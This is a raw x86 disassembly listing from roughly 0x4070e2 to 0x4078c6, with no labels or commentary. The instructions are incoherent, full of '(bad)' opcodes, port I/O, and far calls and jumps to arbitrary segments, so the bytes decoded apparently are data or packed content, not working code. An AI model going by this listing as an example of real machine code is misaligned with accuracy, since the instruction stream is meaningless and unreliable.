  4070e2:	cmp    al,0x21
  4070e4:	push   ebx
  4070e5:	repz xor BYTE PTR [ebx],al
  4070e8:	jne    0x407083
  4070ea:	push   ebp
  4070eb:	inc    ebp
  4070ec:	sub    eax,0x48ac3fce
  4070f1:	jle    0x407095
  4070f3:	fist   DWORD PTR [edi]
  4070f5:	jmp    0x4070ed
  4070f7:	das    
  4070f8:	xchg   ebx,eax
  4070f9:	das    
  4070fa:	call   0x4368:0x57f1eb7b
  407101:	call   0xa271:0xad8d2476
  407108:	ret    0x88e9
  40710b:	out    0x9d,al
  40710d:	daa    
  40710e:	push   edx
  40710f:	stos   DWORD PTR es:[edi],eax
  407110:	and    eax,0x39e5fb7f
  407115:	push   ss
  407116:	aad    0xb6
  407118:	jbe    0x4070a5
  40711a:	push   es
  40711b:	fnsave [edx+0x6820a5fb]
  407121:	cmp    eax,0xc135e623
  407126:	mov    DWORD PTR [edi+0x3b5a0556],ebp
  40712c:	jmp    0x4408:0x35a7df3a
  407133:	outs   dx,DWORD PTR ds:[esi]
  407134:	xor    al,0x13
  407136:	push   ds
  407137:	jnp    0x40715b
  407139:	adc    BYTE PTR [edi+0xe],ah
  40713c:	mov    ch,0x40
  40713e:	out    0x28,eax
  407140:	mov    al,0xb0
  407142:	push   esp
  407143:	cmp    eax,ebx
  407145:	shl    BYTE PTR [eax+0x4e],1
  407148:	xchg   esp,eax
  407149:	jmp    DWORD PTR [ecx+0x56036bd4]
  40714f:	jae    0x40713a
  407151:	data16 jecxz 0x407169
  407154:	inc    esp
  407155:	push   edx
  407156:	shl    DWORD PTR [eax+0x59],0x67
  40715a:	mov    ecx,0x1dc3f4d0
  40715f:	inc    esp
  407160:	jmp    0x5611320b
  407165:	cmp    esp,DWORD PTR [edx+0x8]
  407168:	pop    edx
  407169:	clc    
  40716a:	xor    eax,0xd3ecca29
  40716f:	or     BYTE PTR [ebx],cl
  407171:	mov    ch,0x59
  407173:	cmc    
  407174:	add    eax,0x8d012a29
  407179:	or     DWORD PTR [ebx+0x23597544],0x784564b5
  407183:	jbe    0x407122
  407185:	sub    DWORD PTR [eax],edx
  407187:	fs cwde 
  407189:	addr16 cld 
  40718b:	hlt    
  40718c:	cmp    al,0x3b
  40718e:	nop
  40718f:	adc    al,0x42
  407191:	inc    esp
  407192:	sbb    eax,0x77d384ad
  407197:	cli    
  407198:	enter  0x9077,0xe8
  40719c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40719d:	xchg   dh,ah
  40719f:	mov    cl,0xa5
  4071a1:	mov    edi,0x5618d1ba
  4071a6:	push   esi
  4071a7:	dec    esp
  4071a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a9:	cmp    ch,BYTE PTR [ebp-0x2e]
  4071ac:	cmp    BYTE PTR [edx-0x370fd49c],bl
  4071b2:	or     BYTE PTR [edx+0x58],dl
  4071b5:	push   eax
  4071b6:	test   DWORD PTR [esi+ebp*2],ecx
  4071b9:	jne    0x4071c1
  4071bb:	test   al,0x32
  4071bd:	xor    BYTE PTR [eax-0x1c89a1b0],cl
  4071c3:	xchg   dl,bl
  4071c5:	mov    bl,0xe
  4071c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c8:	call   0xec584827
  4071cd:	or     BYTE PTR ss:[ebp+0x11346653],dh
  4071d4:	mov    eax,esi
  4071d6:	xchg   edi,eax
  4071d7:	mov    ch,0x21
  4071d9:	inc    eax
  4071da:	out    dx,al
  4071db:	add    BYTE PTR [edi],al
  4071dd:	scas   al,BYTE PTR es:[edi]
  4071de:	loop   0x4071dc
  4071e0:	push   0xffffffd0
  4071e2:	cs (bad) 
  4071e4:	mov    al,0x2a
  4071e6:	pop    ss
  4071e7:	add    al,0x36
  4071e9:	std    
  4071ea:	xor    DWORD PTR [ebp+0x29d02b3e],0x14
  4071f1:	clc    
  4071f2:	pop    ebx
  4071f3:	jb     0x40718f
  4071f5:	(bad)  
  4071f6:	lahf   
  4071f7:	mov    ah,0x41
  4071f9:	or     eax,0x208fcae3
  4071fe:	pop    ss
  4071ff:	push   ebx
  407200:	popf   
  407201:	int    0x73
  407203:	mov    al,0x30
  407205:	aas    
  407206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407207:	and    eax,DWORD PTR [esi]
  407209:	inc    ebp
  40720a:	lods   al,BYTE PTR ds:[esi]
  40720b:	jp     0x407223
  40720d:	sub    DWORD PTR [esi-0xd],edi
  407210:	aas    
  407211:	dec    ecx
  407212:	push   eax
  407213:	push   ss
  407214:	cli    
  407215:	lds    esp,FWORD PTR [ebp+0x38]
  407218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407219:	mov    al,ds:0x9a94d2da
  40721e:	outs   dx,BYTE PTR ds:[esi]
  40721f:	test   eax,0x57c11739
  407224:	lods   al,BYTE PTR ds:[esi]
  407225:	add    DWORD PTR [esi-0x59],edi
  407228:	in     al,0x39
  40722a:	adc    DWORD PTR [edi],0x2c0d65d3
  407230:	std    
  407231:	enter  0x57bc,0xa2
  407235:	jns    0x407285
  407237:	gs jne 0x4071e9
  40723a:	rol    BYTE PTR [ecx],cl
  40723c:	shl    DWORD PTR [esi-0x585a7a7],1
  407242:	scas   al,BYTE PTR es:[edi]
  407243:	xor    ebx,DWORD PTR [eax-0x7f]
  407246:	out    dx,eax
  407247:	push   edi
  407248:	rcr    ch,0x54
  40724b:	inc    edx
  40724c:	and    dl,dl
  40724e:	out    0xfc,eax
  407250:	sbb    DWORD PTR [ebp-0x3f9fee9b],esi
  407256:	loop   0x40726c
  407258:	out    0x54,eax
  40725a:	mov    WORD PTR [edx-0x31c70b9e],?
  407260:	jbe    0x40722c
  407262:	jns    0x407297
  407264:	sbb    al,0x1
  407266:	push   edi
  407267:	(bad)  
  407268:	mov    eax,0xe2ca18b8
  40726d:	push   cs
  40726e:	xor    BYTE PTR [esi-0x9fbcb1e],ch
  407274:	and    ebp,edi
  407276:	in     eax,dx
  407277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407278:	mov    al,ah
  40727a:	aam    0xbe
  40727c:	xlat   BYTE PTR ds:[ebx]
  40727d:	retf   0xfb0
  407280:	push   esp
  407281:	pop    esi
  407282:	adc    al,0x2e
  407284:	xchg   DWORD PTR [edi-0x75],edi
  407287:	adc    edi,DWORD PTR [eax-0x5]
  40728a:	test   eax,0x3839965b
  40728f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407290:	adc    al,0xd8
  407292:	data16 xlat BYTE PTR ds:[ebx]
  407294:	pusha  
  407295:	fwait
  407296:	stos   BYTE PTR es:[edi],al
  407297:	adc    BYTE PTR [ecx+eiz*4],bh
  40729a:	mov    edx,0x7faf7f9b
  40729f:	pop    ebx
  4072a0:	jae    0x4072d5
  4072a2:	inc    esp
  4072a3:	pusha  
  4072a4:	je     0x407266
  4072a6:	dec    bl
  4072a8:	or     DWORD PTR es:[edx+0x577276a1],0x10
  4072b0:	mov    ebp,0x3381718c
  4072b5:	ins    DWORD PTR es:[edi],dx
  4072b6:	nop
  4072b7:	clc    
  4072b8:	das    
  4072b9:	icebp  
  4072ba:	jmp    0xbd7cfbe6
  4072bf:	xor    al,0x48
  4072c1:	push   cs
  4072c2:	cmp    eax,0x26c8e83f
  4072c7:	or     DWORD PTR [ebx-0x791decaf],0xc89f7d08
  4072d1:	loope  0x407302
  4072d3:	ins    BYTE PTR es:[edi],dx
  4072d4:	sub    al,0x81
  4072d6:	xchg   dl,dh
  4072d8:	mov    bl,0x6f
  4072da:	ins    BYTE PTR es:[di],dx
  4072dc:	push   cs
  4072dd:	cmp    al,0x9f
  4072df:	xchg   DWORD PTR [ecx],esp
  4072e1:	imul   ebp,eax,0x52535af6
  4072e7:	push   es
  4072e8:	sbb    bl,BYTE PTR [eax+0x47df5170]
  4072ee:	daa    
  4072ef:	enter  0x87d7,0x75
  4072f3:	shr    BYTE PTR [ecx-0x65b48557],0xb6
  4072fa:	pop    ss
  4072fb:	(bad)  
  4072fc:	push   edx
  4072fd:	call   0xc00d:0x2fa216c9
  407304:	stc    
  407305:	das    
  407306:	mov    WORD PTR [eax+0x4f],ss
  407309:	push   esi
  40730a:	stos   BYTE PTR es:[edi],al
  40730b:	cmp    ecx,eax
  40730d:	push   esi
  40730e:	push   ebp
  40730f:	inc    edi
  407310:	in     al,0x72
  407312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407313:	xor    eax,0x40a81807
  407318:	test   BYTE PTR [ebx-0xe],ah
  40731b:	fwait
  40731c:	adc    eax,0x87e50679
  407321:	sti    
  407322:	mov    al,ds:0x44722d96
  407327:	bound  edx,QWORD PTR [eax+esi*4+0x18a7753f]
  40732e:	mov    ds:0xf38c22ae,eax
  407333:	add    BYTE PTR [ecx+0x1c],0x5a
  407337:	xchg   ecx,eax
  407338:	and    eax,0x2a19e743
  40733d:	aad    0x2b
  40733f:	or     DWORD PTR [ebp-0x863b8],0xf3e5bbe9
  407349:	sahf   
  40734a:	popa   
  40734b:	push   ecx
  40734c:	xchg   DWORD PTR [edx+0x5bb0ec3b],ebx
  407352:	jmp    0xf420:0x900c3781
  407359:	(bad)
  40735c:	jne    0x40738a
  40735e:	loopne 0x407310
  407360:	in     al,dx
  407361:	cwde   
  407362:	sbb    cl,BYTE PTR [edi]
  407364:	sti    
  407365:	and    eax,DWORD PTR [esi+0x36]
  407368:	xlat   BYTE PTR ds:[ebx]
  407369:	shr    DWORD PTR [edx],0x57
  40736c:	dec    eax
  40736d:	xor    eax,0xe99ead1a
  407372:	xor    eax,0x81336ba1
  407377:	jne    0x4073ca
  407379:	jb     0x4073c5
  40737b:	jmp    0x346d:0x5fcd4a7
  407382:	jbe    0x407381
  407384:	pop    eax
  407385:	sub    eax,0xaee3fb8f
  40738a:	cmp    esi,DWORD PTR [edi]
  40738c:	pop    ecx
  40738d:	pushf  
  40738e:	cmp    eax,0x18ab509b
  407393:	push   esp
  407394:	dec    esp
  407395:	data16 mov dl,BYTE PTR [edx]
  407398:	mov    eax,0x6af0eaa2
  40739d:	pop    edx
  40739e:	jmp    0x407352
  4073a0:	jecxz  0x4073e3
  4073a2:	mov    esp,0x59f6249a
  4073a7:	(bad)  
  4073a9:	cmp    al,BYTE PTR [esi+ebx*2]
  4073ac:	fwait
  4073ad:	sbb    cl,dh
  4073af:	and    eax,0x6a9210ba
  4073b4:	stc    
  4073b5:	cld    
  4073b6:	inc    edi
  4073b7:	pop    edx
  4073b8:	xchg   BYTE PTR [ebx],dl
  4073ba:	xchg   edi,eax
  4073bb:	fdiv   QWORD PTR [ebx+0x73]
  4073be:	outs   dx,DWORD PTR ds:[esi]
  4073bf:	xchg   edx,eax
  4073c0:	pop    edx
  4073c1:	cs iret 
  4073c3:	loop   0x40742a
  4073c5:	pop    ds
  4073c6:	add    eax,DWORD PTR [ebx]
  4073c8:	in     eax,0xf4
  4073ca:	sub    BYTE PTR [ecx-0x11],0xf2
  4073ce:	mov    ds:0x3fbc2af9,eax
  4073d3:	xchg   ebx,eax
  4073d4:	vcvttsd2si edi,QWORD PTR [ebx-0x73e84f22]
  4073dc:	cmp    eax,edx
  4073de:	mov    ds:0x40e476f6,al
  4073e3:	fs xchg sp,ax
  4073e6:	and    edx,edi
  4073e8:	and    bh,BYTE PTR [edi]
  4073ea:	int    0xff
  4073ec:	rcr    DWORD PTR [eax+0x2edafff9],cl
  4073f2:	push   ss
  4073f3:	cmc    
  4073f4:	mov    ecx,0xb3b5799a
  4073f9:	sbb    ebp,DWORD PTR [edi]
  4073fb:	fidiv  DWORD PTR ds:0x47d0e454
  407401:	or     al,0x33
  407403:	cs ret 
  407405:	lods   al,BYTE PTR ds:[esi]
  407406:	sub    ch,dh
  407408:	mov    cl,BYTE PTR [edi+0x476bb7d5]
  40740e:	das    
  40740f:	push   ss
  407410:	xor    DWORD PTR [ebx+0xc],edx
  407413:	lock xor ah,BYTE PTR [edi-0x36aaca88]
  40741a:	or     BYTE PTR [edx],ch
  40741c:	lahf   
  40741d:	jmp    0x4073df
  40741f:	out    dx,eax
  407420:	out    0x42,al
  407422:	cmp    DWORD PTR [esi+0x3e],esp
  407425:	test   al,0xab
  407427:	xchg   edi,eax
  407428:	inc    edx
  407429:	ja     0x407471
  40742b:	leave  
  40742c:	and    BYTE PTR [edx],dh
  40742e:	inc    DWORD PTR [ecx]
  407430:	lea    ebp,[ecx]
  407432:	imul   edi,ebp,0xa4ca1083
  407438:	(bad)  
  407439:	push   eax
  40743a:	repz popf 
  40743c:	inc    edx
  40743d:	mov    al,ds:0xcf9764ac
  407442:	push   edx
  407443:	loopne 0x4074b2
  407445:	test   eax,0x28cc5f84
  40744a:	sbb    bh,BYTE PTR [ebx]
  40744c:	sbb    al,0x90
  40744e:	and    eax,0x55836815
  407453:	lods   al,BYTE PTR ds:[esi]
  407454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407455:	add    dl,BYTE PTR [esi-0x8dcbad5]
  40745b:	fistp  QWORD PTR [ecx+0x2cc446be]
  407461:	mov    ?,ecx
  407463:	out    dx,eax
  407464:	dec    edx
  407465:	jp     0x4464ac1f
  40746b:	mov    cl,0x27
  40746d:	adc    DWORD PTR [edx+edi*2+0xe],0x7e
  407472:	in     al,0x8c
  407474:	adc    BYTE PTR [ebp+edi*8+0x2],bl
  407478:	sub    DWORD PTR [edx-0x572a3c7b],esi
  40747e:	repnz (bad) 
  407480:	xor    al,0x4f
  407482:	gs dec esp
  407484:	ds pop esi
  407486:	imul   ecx,DWORD PTR [esi],0x19b9a31e
  40748c:	dec    BYTE PTR [ebx+0x42889463]
  407492:	mov    al,BYTE PTR [edi+esi*2+0x7d]
  407496:	sub    ch,ch
  407498:	add    cl,BYTE PTR [ebp-0x3fbb65b0]
  40749e:	je     0x40751d
  4074a0:	dec    edx
  4074a1:	adc    eax,0x535b9c3c
  4074a6:	inc    esi
  4074a7:	pop    edi
  4074a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074a9:	fcom   QWORD PTR [ecx-0x6f]
  4074ac:	xlat   BYTE PTR ds:[ebx]
  4074ad:	cdq    
  4074ae:	in     al,0xa
  4074b0:	xchg   ebx,eax
  4074b1:	in     eax,dx
  4074b2:	mov    di,cx
  4074b5:	inc    esi
  4074b6:	test   DWORD PTR [ebx+0x2481394],esi
  4074bc:	inc    ebp
  4074bd:	push   es
  4074be:	mov    al,0x12
  4074c0:	es inc esi
  4074c2:	pusha  
  4074c3:	daa    
  4074c4:	aaa    
  4074c5:	ret    0x1cc2
  4074c8:	cwde   
  4074c9:	out    dx,eax
  4074ca:	sub    al,0xde
  4074cc:	or     edi,0xe223dbbf
  4074d2:	in     al,0xd3
  4074d4:	daa    
  4074d5:	aam    0x10
  4074d7:	xchg   edx,eax
  4074d8:	dec    esi
  4074d9:	shl    DWORD PTR [edi],cl
  4074db:	pop    esp
  4074dc:	shl    BYTE PTR [esp+edi*8+0x69abe9af],cl
  4074e3:	(bad)  
  4074e4:	fmul   DWORD PTR [esi]
  4074e6:	and    eax,0xc6f131ba
  4074eb:	popa   
  4074ec:	fucomi st,st(2)
  4074ee:	lods   al,BYTE PTR ds:[esi]
  4074ef:	gs push ecx
  4074f1:	gs out dx,al
  4074f3:	popa   
  4074f4:	test   BYTE PTR [esi+0x17],bh
  4074f7:	scas   al,BYTE PTR es:[edi]
  4074f8:	out    dx,al
  4074f9:	push   cs
  4074fa:	call   0xf5c59381
  4074ff:	sub    eax,DWORD PTR gs:[edi-0x7d30fed1]
  407506:	cmc    
  407507:	shl    BYTE PTR ds:0xe576e986,cl
  40750d:	push   ds
  40750e:	push   0x26
  407510:	addr16 ret 0x6a6
  407514:	lea    ecx,[ebx-0x11]
  407517:	pop    ebp
  407518:	sub    al,0x17
  40751a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40751b:	push   ebx
  40751c:	pop    edi
  40751d:	jl     0x4074bd
  40751f:	sti    
  407520:	fdivr  DWORD PTR [edx-0x46914a3d]
  407526:	pop    eax
  407527:	cmp    eax,0xb704dad1
  40752c:	cld    
  40752d:	repz dec ebx
  40752f:	jmp    0x64ccf678
  407534:	xor    cl,dh
  407536:	and    ebp,ecx
  407538:	sub    eax,0xc6df394f
  40753d:	loope  0x407549
  40753f:	les    edi,FWORD PTR [ebx+0x580db00a]
  407545:	inc    edx
  407546:	mov    dx,0x3af8
  40754a:	add    dl,BYTE PTR [ecx-0x31286b0f]
  407550:	and    WORD PTR [edx],0x16
  407554:	int3   
  407555:	mov    ah,0xfb
  407557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407558:	dec    ebx
  407559:	mov    ebp,edx
  40755b:	sar    BYTE PTR [ecx+ebx*8+0x33],1
  40755f:	adc    al,0x49
  407561:	mov    ecx,esi
  407563:	cmp    al,0x63
  407565:	mov    cl,0x79
  407567:	push   eax
  407568:	mov    eax,ds:0x805d6608
  40756d:	outs   dx,DWORD PTR ds:[esi]
  40756e:	je     0x40758d
  407570:	pop    esi
  407571:	adc    DWORD PTR gs:[ebx],0xf2e880af
  407578:	mov    ebp,DWORD PTR [ebp-0x7365ad3c]
  40757e:	in     al,dx
  40757f:	test   al,0x61
  407581:	jmp    FWORD PTR [eax+0xd]
  407584:	sti    
  407585:	out    dx,eax
  407586:	sub    eax,0xb961a7a2
  40758b:	xchg   ecx,eax
  40758c:	imul   eax,DWORD PTR [eax+0x8],0x69
  407590:	ret    
  407591:	outs   dx,DWORD PTR ds:[esi]
  407592:	inc    edx
  407593:	pop    ecx
  407594:	sbb    ch,BYTE PTR [esi-0x34d5a459]
  40759a:	sub    al,0xf5
  40759c:	sub    al,0xb8
  40759e:	(bad)  
  4075a0:	adc    eax,eax
  4075a2:	mov    ds:0x3744dd16,al
  4075a7:	dec    esp
  4075a8:	pop    ecx
  4075a9:	sar    BYTE PTR [esi-0x5e7d9dd],cl
  4075af:	pop    es
  4075b0:	popf   
  4075b1:	cmp    al,0x95
  4075b3:	pop    esi
  4075b4:	hlt    
  4075b5:	mov    eax,0x6bb6a12
  4075ba:	or     eax,0x223439b9
  4075bf:	and    al,0x36
  4075c1:	pop    ss
  4075c2:	or     esp,DWORD PTR [ecx]
  4075c4:	cld    
  4075c5:	int    0xe9
  4075c7:	sti    
  4075c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075c9:	jo     0x4075ba
  4075cb:	mov    cl,0x10
  4075cd:	add    eax,0xe4e0fa39
  4075d2:	imul   esi,DWORD PTR [ebx+0x5a],0x60
  4075d6:	imul   eax,DWORD PTR [eax-0x4d3b7137],0x49
  4075dd:	jb     0x4075af
  4075df:	adc    dh,BYTE PTR [esp+edi*8]
  4075e2:	dec    ebp
  4075e3:	pop    es
  4075e4:	cld    
  4075e5:	pop    ebx
  4075e6:	fwait
  4075e7:	or     al,0x2
  4075e9:	mov    ah,0x9e
  4075eb:	stos   DWORD PTR es:[edi],eax
  4075ec:	or     ecx,DWORD PTR ds:0x48d62f5e
  4075f2:	and    eax,0x4746c008
  4075f7:	sbb    ecx,esp
  4075f9:	pop    ecx
  4075fa:	mov    ds,WORD PTR [ecx+0x640b0fc0]
  407600:	jnp    0x4075e5
  407602:	inc    esp
  407603:	adc    ebx,DWORD PTR [ebx]
  407605:	inc    ebp
  407606:	mov    ecx,DWORD PTR [esp+ecx*8-0x4e]
  40760a:	in     eax,dx
  40760b:	mov    ah,BYTE PTR [edi-0x3a]
  40760e:	mov    dh,0x1e
  407610:	fcomp  QWORD PTR [ebp+0x54]
  407613:	pop    ebx
  407614:	jmp    0x4075ca
  407616:	ins    BYTE PTR es:[edi],dx
  407617:	adc    eax,0x9238b946
  40761c:	dec    edi
  40761d:	pop    esp
  40761e:	adc    DWORD PTR [esi],edi
  407620:	ja     0x407640
  407622:	sbb    ah,BYTE PTR [ecx-0x21]
  407625:	jle    0x40764e
  407627:	lock inc esi
  407629:	loop   0x407667
  40762b:	pminsw mm4,QWORD PTR [edx]
  40762e:	or     eax,0x9b023522
  407633:	sar    edx,1
  407635:	mov    dh,0x7a
  407637:	aad    0xd8
  407639:	fist   DWORD PTR [ecx]
  40763b:	shr    BYTE PTR ds:0x78c9c724,1
  407641:	rol    DWORD PTR [esi-0x21],0x67
  407645:	je     0x40766d
  407647:	scas   al,BYTE PTR es:[edi]
  407648:	xlat   BYTE PTR ds:[ebx]
  407649:	lahf   
  40764a:	jne    0x407602
  40764c:	nop
  40764d:	(bad)  
  40764e:	mov    bh,0xa1
  407650:	sub    BYTE PTR [ebx],bl
  407652:	pop    ebp
  407653:	xchg   BYTE PTR [ebx+0x6052c723],al
  407659:	cmp    al,0x55
  40765b:	jno    0x407656
  40765d:	fwait
  40765e:	icebp  
  40765f:	fs call 0xc6e9166c
  407665:	repz sbb al,0x1f
  407668:	mov    bh,BYTE PTR [edi-0x5f3eaa9c]
  40766e:	(bad)  
  40766f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407670:	and    eax,0x14e21c14
  407675:	pop    es
  407676:	jle    0x40760d
  407678:	das    
  407679:	pop    ds
  40767a:	mov    ebx,0x24d55491
  40767f:	out    0x38,eax
  407681:	mov    edx,0xed88772b
  407686:	fcmove st,st(0)
  407688:	cmp    al,0x9
  40768a:	cli    
  40768b:	inc    esp
  40768c:	sub    eax,0xab1aadf1
  407691:	cld    
  407692:	or     eax,ebx
  407694:	push   cs
  407695:	fdivp  st(3),st
  407697:	sti    
  407698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407699:	fidivr DWORD PTR [ebp-0x42]
  40769c:	jle    0x4076fc
  40769e:	cmp    BYTE PTR [eax],ah
  4076a0:	ins    DWORD PTR es:[edi],dx
  4076a1:	dec    esp
  4076a2:	or     eax,0xf146ad1e
  4076a7:	int3   
  4076a8:	inc    edi
  4076a9:	out    0x79,al
  4076ab:	call   DWORD PTR [ebp-0x36a446fc]
  4076b1:	cmp    eax,0x8971535c
  4076b6:	xor    DWORD PTR [ebx+0x17],esp
  4076b9:	pop    edx
  4076ba:	hlt    
  4076bb:	pop    esp
  4076bc:	(bad)  
  4076bd:	aad    0xa6
  4076bf:	ds xchg edi,eax
  4076c1:	test   DWORD PTR [edi+eax*1-0x3bc8b71d],ecx
  4076c8:	cs sbb al,bh
  4076cb:	rol    DWORD PTR [ebx-0x18ff07e8],0xd5
  4076d2:	jno    0x4076fe
  4076d4:	fisub  DWORD PTR [edi-0x4c]
  4076d7:	leave  
  4076d8:	(bad)  
  4076d9:	push   eax
  4076da:	fs aad 0x63
  4076dd:	inc    esi
  4076de:	js     0x4076d6
  4076e0:	popa   
  4076e1:	jp     0x4076cd
  4076e3:	repnz inc edx
  4076e5:	and    DWORD PTR [ebp-0x61],eax
  4076e8:	jns    0x407764
  4076ea:	xlat   BYTE PTR ds:[ebx]
  4076eb:	jns    0x4076e4
  4076ed:	push   0x4c
  4076ef:	inc    eax
  4076f0:	sahf   
  4076f1:	sar    BYTE PTR [esi],1
  4076f3:	lods   al,BYTE PTR ds:[esi]
  4076f4:	psubd  mm6,QWORD PTR [ecx+eax*8-0x5e]
  4076f9:	lods   al,BYTE PTR ds:[esi]
  4076fa:	pusha  
  4076fb:	inc    ecx
  4076fc:	sub    cl,BYTE PTR [eax-0x3f]
  4076ff:	stos   DWORD PTR es:[edi],eax
  407700:	xchg   BYTE PTR [ecx+0x42d83846],bl
  407706:	adc    esi,DWORD PTR [esi+0x2b2053fd]
  40770c:	daa    
  40770d:	mov    eax,ds:0x28ada767
  407712:	sar    ah,cl
  407714:	mov    al,BYTE PTR [eax]
  407716:	push   esi
  407717:	mov    ebp,0x6a58d70d
  40771c:	xchg   ecx,eax
  40771d:	test   eax,0x655d5f6b
  407722:	ret    
  407723:	lock sbb eax,ebx
  407726:	xchg   DWORD PTR [ebx+esi*8],esp
  407729:	mov    edi,0x8cc98d07
  40772e:	lock pop esp
  407730:	pop    edi
  407731:	or     al,0xa9
  407733:	sbb    eax,0x1fd3af66
  407738:	xor    DWORD PTR [ebx],esp
  40773a:	dec    BYTE PTR [ebx]
  40773c:	stos   BYTE PTR es:[edi],al
  40773d:	fidivr DWORD PTR [edi-0x1f]
  407740:	inc    esp
  407741:	adc    eax,0x2b1e5770
  407746:	mov    cl,bl
  407748:	jno    0x407733
  40774a:	sar    DWORD PTR [ebp+ecx*1-0x2f],1
  40774e:	aam    0xb
  407750:	sahf   
  407751:	cld    
  407752:	jo     0x407746
  407754:	mov    ch,0x11
  407756:	jnp    0x407799
  407758:	adc    al,0xa9
  40775a:	pop    edi
  40775b:	sub    al,0xd
  40775d:	cmp    BYTE PTR [ebx+0x39],dl
  407760:	jne    0x4077a0
  407762:	ds push ebx
  407764:	xor    eax,0x191887ee
  407769:	sbb    eax,DWORD PTR [esi+0x720d2f23]
  40776f:	xchg   ebx,eax
  407770:	retf   
  407771:	add    ebx,DWORD PTR [edx+0x24]
  407774:	je     0x407780
  407776:	pop    ebp
  407777:	cld    
  407778:	fidiv  DWORD PTR [ebp+0x43]
  40777b:	lods   eax,DWORD PTR ds:[esi]
  40777c:	push   ebx
  40777d:	loope  0x407725
  40777f:	inc    eax
  407780:	je     0x407753
  407782:	ret    
  407783:	xor    BYTE PTR [eax+0x59],dl
  407786:	mov    ecx,0xa339807b
  40778b:	arpl   WORD PTR [esi-0x22623592],dx
  407791:	pushf  
  407792:	dec    ebp
  407793:	rol    esp,0x42
  407796:	sub    esp,ebp
  407798:	mov    dh,0x12
  40779a:	xlat   BYTE PTR ds:[ebx]
  40779b:	push   ds
  40779c:	sub    eax,0x567fd8c9
  4077a1:	popf   
  4077a2:	cmp    eax,0x702e18de
  4077a7:	mov    edi,0x5bdc048
  4077ac:	push   ecx
  4077ad:	cmp    eax,0xa02d4fc4
  4077b2:	jnp    0x4077e4
  4077b4:	and    al,0x8e
  4077b6:	sti    
  4077b7:	shl    DWORD PTR [esi+0x2d7f87e3],0xed
  4077be:	sbb    edx,DWORD PTR [eax*8+0x4286bc7f]
  4077c5:	adc    ah,bh
  4077c7:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077c9:	test   eax,0xa0c3d97c
  4077ce:	mov    cs,eax
  4077d0:	mov    al,ds:0xea9be43b
  4077d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077d6:	mov    esp,0x6f2b2df7
  4077db:	lea    ebx,[eax+ebp*8-0x74]
  4077df:	dec    ebx
  4077e0:	add    DWORD PTR [ecx+0x2],ebp
  4077e3:	rcl    DWORD PTR [esp+edi*4],1
  4077e6:	pop    ds
  4077e7:	cmp    ecx,DWORD PTR [edi+0x23d763cb]
  4077ed:	sysenter 
  4077ef:	call   0x7743:0xc03372f6
  4077f6:	xchg   BYTE PTR [eax],bl
  4077f8:	jp     0x4077a6
  4077fa:	(bad)  
  4077fb:	das    
  4077fc:	ins    BYTE PTR es:[edi],dx
  4077fd:	aad    0x66
  4077ff:	pop    es
  407800:	cli    
  407801:	fisubr WORD PTR [esp+edi*8-0x1]
  407805:	mov    edx,0xa2125594
  40780a:	xor    ebp,DWORD PTR [ebx-0x69bc7e27]
  407810:	pop    eax
  407811:	and    DWORD PTR [ebx-0x6e],eax
  407814:	repnz nop
  407816:	push   esi
  407817:	inc    edx
  407818:	xor    eax,0x58d6bad4
  40781d:	in     eax,0xeb
  40781f:	inc    esp
  407820:	and    al,0xb3
  407822:	ins    DWORD PTR es:[edi],dx
  407823:	adc    BYTE PTR [ecx*4-0x72c063d0],0xc6
  40782b:	jnp    0x40787f
  40782d:	jo     0x4077ca
  40782f:	retf   
  407830:	call   0xe54aa5ae
  407835:	mov    ebx,0xf439d2d3
  40783a:	ret    
  40783b:	add    edx,ebp
  40783d:	mov    al,ds:0xbfee908c
  407842:	xor    BYTE PTR [edx-0x59],cl
  407845:	fiadd  DWORD PTR [eax+0x21fdaf49]
  40784b:	xchg   ebp,eax
  40784c:	ds inc edx
  40784e:	xchg   esi,eax
  40784f:	and    eax,0x128b0278
  407854:	mov    bl,0x47
  407856:	inc    edi
  407857:	cld    
  407858:	stos   BYTE PTR es:[edi],al
  407859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40785a:	or     esp,DWORD PTR [esi+edi*8+0x3]
  40785e:	dec    edi
  40785f:	stc    
  407860:	mov    eax,ds:0xd7194d5d
  407865:	je     0x407807
  407867:	xor    BYTE PTR [esi+0x34],dh
  40786a:	mov    ss,edi
  40786c:	dec    BYTE PTR [edi]
  40786e:	mov    al,ds:0x942663e2
  407873:	nop
  407874:	fldenv [eax-0x4835411e]
  40787a:	shl    DWORD PTR [edx-0x53acfc5e],cl
  407880:	int3   
  407881:	xor    ebx,eax
  407883:	push   0x74
  407885:	jle    0x40780c
  407887:	outs   dx,DWORD PTR ds:[esi]
  407888:	retf   
  407889:	dec    esi
  40788a:	mov    edx,0x33c1664a
  40788f:	lods   al,BYTE PTR ds:[esi]
  407890:	fadd   QWORD PTR [edi+0x25]
  407893:	inc    ebp
  407894:	iret   
  407895:	mov    edi,0x7b1243ea
  40789a:	cmp    eax,0xf4dba1f3
  40789f:	xor    BYTE PTR [esp+eiz*4],cl
  4078a2:	dec    esp
  4078a3:	into   
  4078a4:	rcl    BYTE PTR [esi],0x71
  4078a7:	mov    WORD PTR [edi+0x4aad6c9],gs
  4078ad:	ret    0xc85
  4078b0:	aaa    
  4078b1:	(bad)  
  4078b2:	jbe    0x4078c7
  4078b4:	ror    DWORD PTR fs:[ebx],cl
  4078b7:	pop    ebp
  4078b8:	fisubr DWORD PTR [edi+0x35]
  4078bb:	mov    esp,0x26018b13
  4078c0:	call   0xe476:0x1132
  4078c6:	out    0x9b,eax
